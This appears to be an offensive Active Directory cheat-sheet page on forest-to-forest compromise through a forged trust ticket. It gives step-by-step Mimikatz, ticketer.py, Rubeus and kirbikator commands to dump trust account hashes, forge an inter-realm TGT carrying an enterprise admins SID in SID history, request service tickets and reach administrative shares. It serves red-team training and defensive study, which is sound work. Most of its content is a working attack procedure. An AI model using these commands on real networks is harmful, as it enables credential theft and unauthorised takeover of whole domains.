# Forest to Forest Compromise - Trust Ticket

* Require: SID filtering disabled

From the DC, dump the hash of the `currentdomain\targetdomain$` trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using
Mimikatz, adding the SID for the target domain's enterprise admins group to our **SID history**.

## Dumping Trust Passwords (trust keys)

> Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing **$** are computer accounts, but some are trust accounts.

```powershell
lsadump::trust /patch

or find the TRUST_NAME$ machine account hash
```

## Create a Forged Trust Ticket (inter-realm TGT)

* using **Mimikatz**

    ```powershell
    mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\temp\trust.kirbi
    mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi
    ```

* using **Ticketer**

    ```ps1
    ticketer.py -nthash <NT_HASH> -domain-sid <S-1-5-21-SID> -domain <domain.lab> -extra-sid <S-1-5-21-SID_ENTERPRISE_ADM-519> -spn <krbtgt/domain.lab> <dummy name> 

    # -nthash: The hash to authenticate as the trust account.
    # -domain-sid: The SID for the domain that the account is valid in. 
    # -domain: The domain which the creds are valid on.
    # -extra-sid: The SID for Enterprise Admin's Group
    # -spn: The target service for the other domain
    # <dummy name>: The user doesn't have to be real.
    ```

## Use the Trust Ticket file to get a Service Ticket

```powershell
.\asktgs.exe c:\temp\trust.kirbi CIFS/machine.domain.local
.\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

Inject the Service Ticket file and access the targeted service with the spoofed rights.

```powershell
kirbikator lsa .\ticket.kirbi
ls \\machine.domain.local\c$
```

## References

* [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)
